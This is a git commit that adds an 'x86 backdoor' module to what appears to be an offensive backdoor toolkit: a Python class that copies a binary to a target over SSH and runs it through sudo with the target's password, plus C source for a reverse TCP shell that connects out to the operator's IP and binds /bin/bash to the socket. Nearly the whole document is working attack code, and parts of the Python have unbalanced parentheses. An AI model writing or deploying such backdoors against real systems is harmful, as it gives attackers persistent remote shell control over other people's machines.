cbf0d0e4363f90ec9f98ad9835a4e967d0f86f8e
George Hughey <ghughey@umd.edu>
2016-07-15 12:19:43 -0700

    Added x86 backdoor

---
+++ backdoors/shell/x86.py
@@ -0,0 +1,32 @@
+from backdoor import *
+
+class x86(Backdoor):
+    prompt = Fore.RED + "x86" + Fore.BLUE + ">> " + Fore.RESET
+
+    def __init__(self, core):
+		cmd.Cmd.__init__(self)
+        self.intro = GOOD + "Using x86 module..."
+        self.core = core
+        self.options = { 
+				"port"		: Option("port", 53935, "port to connect to", True),
+                }
+        self.allow_modules = True
+        self.modules = {}
+        self.help_text = "A binary that should run on many x86 platforms allowing for a reverse tcp shell"
+
+    def get_command(self):
+		return "echo " + self.core.curtarget.pword + " | sudo -S nohup ./x86 " + self.core.localIP + " " + str(self.get_value("port")
+
+    def do_exploit(self, args):
+		raw_input("Run the following command: nc -vnlp %s in another shell" % str(self.get_value("port"))
+		target.ssh.exec_command('rm x86')
+		target.scpFiles(self, 'backdoors/shell/x86/x86', False)
+		print(GOOD + "Moving the backdoor program")
+		target.ssh.exec_command(self.get_command())
+		print(GOOD + "Python backdoor on %s attempted." % port)
+		
+		for mod in self.modules.keys():
+			print(INFO + "Attempting to execute " + mod.name + " module...")
+			mod.exploit()
+
+
---
+++ backdoors/shell/x86/Cback.c
@@ -0,0 +1,36 @@
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#define MAX_LEN 20
+
+//IP, then port
+
+int main(int argc, char *argv[]){ 
+	if(argc != 3) {
+		printf("Usage: ./a.out [IP] [PORT\n");
+		exit(0);
+	}
+	int socket_info, pid, connection, port = atoi(argv[2]);
+	struct sockaddr_in info;
+	char ip[MAX_LEN];
+	strcpy(ip, argv[1]);
+	socket_info = socket(AF_INET, SOCK_STREAM, 0);
+	info.sin_family = AF_INET;
+	info.sin_port = htons(port);
+	info.sin_addr.s_addr = inet_addr(ip);
+	connection = connect(socket_info, (struct sockaddr *)&info, sizeof(struct sockaddr));	
+	if((pid = fork()) < 0)
+		printf("Fork Failed\n");
+	else if(pid > 0)
+		wait(NULL);
+	else{
+		dup2(socket_info,0);
+		dup2(socket_info,1);
+		dup2(socket_info,2);
+		execlp("/bin/bash", "/bin/bash", NULL);
+	}
+}
